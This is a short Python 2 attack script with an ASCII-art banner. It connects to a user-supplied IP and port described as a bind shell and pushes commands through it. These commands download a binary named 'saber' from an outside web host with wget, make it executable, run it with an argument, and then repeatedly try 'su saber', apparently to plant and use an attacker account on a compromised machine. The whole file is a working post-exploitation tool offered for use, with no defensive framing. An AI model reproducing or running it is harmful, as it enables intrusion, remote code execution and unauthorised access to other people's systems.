import socket
host = raw_input("The IP > ")
port = input("The Port > ")
logo = '''
$$$$$$$\   $$$$$$\  $$\   $$\ $$\        $$$$$$\  $$$$$$$$\ $$\   $$\ $$$$$$$$\ $$\   $$\ 
$$  __$$\ $$  __$$\ $$ |  $$ |$$ |      $$  __$$\ \____$$  |$$$\  $$ |$$  _____|$$ | $$  |
$$ |  $$ |$$ /  $$ |$$ |  $$ |$$ |      $$ /  $$ |    $$  / $$$$\ $$ |$$ |      $$ |$$  / 
$$$$$$$\ |$$ |  $$ |$$ |  $$ |$$ |      $$$$$$$$ |   $$  /  $$ $$\$$ |$$$$$\    $$$$$  /  
$$  __$$\ $$ |  $$ |$$ |  $$ |$$ |      $$  __$$ |  $$  /   $$ \$$$$ |$$  __|   $$  $$<   
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |      $$ |  $$ | $$  /    $$ |\$$$ |$$ |      $$ |\$$\  
$$$$$$$  | $$$$$$  |\$$$$$$  |$$$$$$$$\ $$ |  $$ |$$  /     $$ | \$$ |$$$$$$$$\ $$ | \$$\ 
\_______/  \______/  \______/ \________|\__|  \__|\__/      \__|  \__|\________|\__|  \__|
                                                                                          
                                                                                          
'''                                                                                          
                                   

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
def con():
	print bcolors.OKBLUE+logo
	try :
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))
		print "successfully connected"
		for i in range(1):
			cmd = "wget http://sigortaline.com.tr/uploads/saber"
			result = s.recv(1024).strip()
			s.send(cmd + "\n")
		for i in range(1):
			cmd = "chmod +x saber"
			result = s.recv(1024).strip()
			s.send(cmd + "\n")
		for i in range(1):
			cmd = "./saber saber2001"
			result = s.recv(1024).strip()
			s.send(cmd + "\n")
			print (result)
		for i in range(3):
			cmd = "su saber"
			result = s.recv(1024).strip()
			s.send(cmd + "\n")
			print (result)
	except socket.error:
		print "[+] Unable to connect to bind shell."
con()
